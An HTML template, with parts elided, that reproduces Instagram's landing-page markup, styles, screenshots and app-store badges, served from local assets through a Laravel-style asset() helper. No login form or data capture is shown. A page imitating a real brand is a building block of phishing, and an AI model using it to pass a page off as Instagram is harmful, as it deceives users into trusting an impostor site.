...
<html lang="en" class="js not-logged-in client-root js-focus-visible sDN5V">
  <head>
	...
	<link rel="icon" type="image/x-icon" 
        src="{{ asset('img/instagram/favicon.png') }}"
        >
    ...
    <style>
      ...
      .wellbeingSpriteTwo_fac_sync {
        background-image: url("{{ asset('img/instagram/static/bundles/es6/sprite_wellbeing_6af9c5060ebc.png/6af9c5060ebc.png') }}");
      }
      .wellbeingSpriteTwo_fac_code {
      ...
      .coreSpriteWindowsStoreButton {        
        background-image: url('{{asset('img/instagram/sprite_core_32f0a4f27407.png')}}' );
      }
      .coreSpriteActivityHeart,
      .coreSpriteAddText {
        background-repeat: no-repeat;
      ...
      @media (min-device-pixel-ratio: 1.5),
        ...
        .coreSpriteWindowsStoreButton,
        .coreSpriteWordmark {
            background-image: url('{{asset('img/instagram/sprite_core_2x_bcd90c1d4868.png')}}');
        }
        .coreSpriteActivityHeart,
        .coreSpriteAddText {
      ...
      .yOZjD {
        ...
        -ms-flex-item-align: center;
        align-self: center;
        background-image: url('{{asset('img/instagram/home-phones.png')}}');
        background-position: 0 0;
      ...
      @media screen and (-webkit-min-device-pixel-ratio: 1.5),
        ...
        .yOZjD {
          background-image: url('{{asset('img/instagram/home-phones@2x.png')}}');
        }
      }
      .V64Sp {
            ...
            <div class="yOZjD _80tAB">
              <div class="V64Sp">
                <img
                  alt=""
                  class="RP4i1"
                  src="{{ asset('img/instagram/screenshot1.jpg') }}"
                /><img
                  alt=""
                  class="RP4i1 UVauz"
                  src="{{ asset('img/instagram/screenshot2.jpg') }}"
                /><img
                  alt=""
                  class="RP4i1 JtrJi"
                  src="{{ asset('img/instagram/screenshot3.jpg') }}"
                /><img
                  alt=""
                  class="RP4i1"
                  src="screenshot4.jpg"
                /><img alt="" class="RP4i1" 
                src="{{ asset('img/instagram/screenshot5.jpg') }}"
                />
              </div>
            </div>
            <div class="rgFsT">
                ...
                <div class="iNy2T">
                  <a
                    ...
                    ><img
                      ...
                      class="Rt8TI"
                      src="{{ asset('img/instagram/badge_ios_english-en.png') }}" 
                      /></a
                  ><a
                    class="z1VUo"
                    ...
                    ><img
                      ...
                      class="Rt8TI"
                      src="{{ asset('img/instagram/badge_android_english-en.png') }}" 
                  /></a>
                </div>
              </div>
            </div>
